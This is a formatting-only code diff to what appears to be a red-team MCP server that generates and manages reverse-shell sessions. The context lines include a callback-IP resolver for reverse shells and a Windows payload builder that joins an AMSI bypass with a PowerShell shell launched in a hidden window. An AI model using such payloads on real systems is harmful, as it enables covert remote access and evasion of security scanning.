@@ -65,6 +65,7 @@ MARKER_END = "__CMD_END_7f3a__"
 
 # --- Callback IP resolution ---
 
+
 def _resolve_callback_ip() -> str:
     """Resolve the attackbox callback IP for reverse shell payloads.
 
@@ -100,7 +101,9 @@ def _resolve_callback_ip() -> str:
     try:
         result = subprocess.run(
             ["ip", "-4", "-o", "addr", "show", "scope", "global"],
-            capture_output=True, text=True, timeout=3,
+            capture_output=True,
+            text=True,
+            timeout=3,
         )
         for line in result.stdout.splitlines():
             parts = line.split()
@@ -118,7 +121,9 @@ def _ip_from_interface(iface: str) -> str | None:
     try:
         result = subprocess.run(
             ["ip", "-4", "-o", "addr", "show", "dev", iface],
-            capture_output=True, text=True, timeout=3,
+            capture_output=True,
+            text=True,
+            timeout=3,
         )
         for line in result.stdout.splitlines():
             parts = line.split()
@@ -157,10 +162,10 @@ def _windows_payload(ip: str, port: int) -> str:
     )
     combined = f"{amsi};{ps_shell}"
     detached = (
-        f"Start-Process -WindowStyle Hidden powershell -ArgumentList "
-        f"'-c {combined}'"
+        f"Start-Process -WindowStyle Hidden powershell -ArgumentList '-c {combined}'"
     )
-    return f"powershell -c \"{detached}\""
+    return f'powershell -c "{detached}"'
+
 
 # Privileged Docker mode
 SHELL_DOCKER_IMAGE = os.environ.get("SHELL_DOCKER_IMAGE", "red-run-shell:latest")
@@ -235,7 +240,9 @@ def _find_orphan_containers() -> list[str]:
         )
         if result.returncode != 0:
             return []
-        return [name.strip() for name in result.stdout.strip().split("\n") if name.strip()]
+        return [
+            name.strip() for name in result.stdout.strip().split("\n") if name.strip()
+        ]
     except Exception:
         return []
 
@@ -1257,13 +1264,15 @@ def create_server() -> FastMCP:
                 addr = f"local (PID {s.remote_addr[1]})"
             else:
                 addr = f"{s.remote_addr[0]}:{s.remote_addr[1]}"
-            sess_list.append({
-                "id": sid,
-                "label": s.label,
-                "addr": addr,
-                "platform": s.platform or "unknown",
-                "connected_at": s.connected_at.isoformat(),
-            })
+            sess_list.append(
+                {
+                    "id": sid,
+                    "label": s.label,
+                    "addr": addr,
+                    "platform": s.platform or "unknown",
+                    "connected_at": s.connected_at.isoformat(),
+                }
+            )
         return JSONResponse({"sessions": sess_list, "count": len(sess_list)})
 
     @mcp.custom_route("/clear", methods=["POST"])
@@ -1279,7 +1288,8 @@ def create_server() -> FastMCP:
                         if s.container_name:
                             subprocess.run(
                                 ["docker", "kill", s.container_name],
-                                capture_output=True, timeout=5,
+                                capture_output=True,
+                                timeout=5,
                             )
                         if s.process:
                             os.killpg(os.getpgid(s.process.pid), signal.SIGTERM)
